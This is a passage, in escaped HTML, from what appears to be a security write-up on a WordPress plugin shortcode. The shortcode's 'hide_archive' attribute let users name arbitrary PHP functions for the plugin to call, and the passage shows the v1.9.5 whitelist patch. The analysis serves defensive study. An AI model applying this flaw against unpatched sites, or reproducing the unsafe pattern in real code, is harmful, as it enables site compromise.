class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_post&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hide_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trim&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hide_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;render()&lt;/code&gt; function of the shortcode accepts the &lt;code&gt;$atts[&#39;hide_archive&#39;]&lt;/code&gt; attribute from the user. This value is a string containing a &lt;strong&gt;list of function names&lt;/strong&gt;, separated by commas (&lt;code&gt;,&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hide_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;a,b,c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hide_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;â†’&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After splitting the string using &lt;code&gt;explode()&lt;/code&gt;, the code uses:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;array_map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trim&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;to &lt;strong&gt;remove extra whitespace&lt;/strong&gt; at the beginning and end of each element, ensuring the function names are â€œcleanâ€ before processing. The result is still an array of strings, but normalized:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[&amp;#34;&amp;ensp;a&amp;ensp;&amp;#34;,&amp;ensp;&amp;#34;&amp;ensp;b&amp;ensp;&amp;#34;,&amp;ensp;&amp;#34;&amp;ensp;c&amp;ensp;&amp;#34;]&amp;ensp;â†’&amp;ensp;[&amp;#34;a&amp;#34;,&amp;ensp;&amp;#34;b&amp;#34;,&amp;ensp;&amp;#34;c&amp;#34;]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, the &lt;code&gt;foreach&lt;/code&gt; loop iterates over each item and assigns it to the &lt;code&gt;$callback&lt;/code&gt; variable. Here, &lt;code&gt;$callback&lt;/code&gt; is a &lt;strong&gt;function name in string form&lt;/strong&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For each &lt;code&gt;$callback&lt;/code&gt;, the code checks:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means:&#xA;ğŸ‘‰ Whether the function name &lt;strong&gt;exists and can be called&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If it is callable, the code then directly invokes the function:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No parameters are passed. If the called function returns &lt;code&gt;true&lt;/code&gt;, the plugin will:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and &lt;strong&gt;display nothing for the shortcode&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v1.9.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch introduces a whitelist of allowed functions to prevent arbitrary function execution.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Shortcode&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PostView&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$archive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;functions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$archive&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$archive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;PostView&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$functions&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_tax&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_home&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_front_page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_search&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_404&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_author&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_category&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_tag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since the &lt;code&gt;Shortcode&lt;/code&gt; class extends &lt;code&gt;PostView&lt;/code&gt;, it can use the &lt;code&gt;$functions&lt;/code&gt; property from the parent class.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a shortcode with the following line:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt-post-modified-info&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;render&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that when WordPress encounters the &lt;strong&gt;&lt;code&gt;lmt-post-modified-info&lt;/code&gt;&lt;/strong&gt; shortcode in a postâ€™s content (or when the post is rendered containing this shortcode), WordPress will &lt;strong&gt;call the &lt;code&gt;render()&lt;/code&gt; method of the current class&lt;/strong&gt; to generate the output.&lt;/p&gt;&#xA;&lt;p&gt;To have the &lt;code&gt;render()&lt;/code&gt; logic executed, the following condition must be satisfied:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enable_last_modified_cb&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 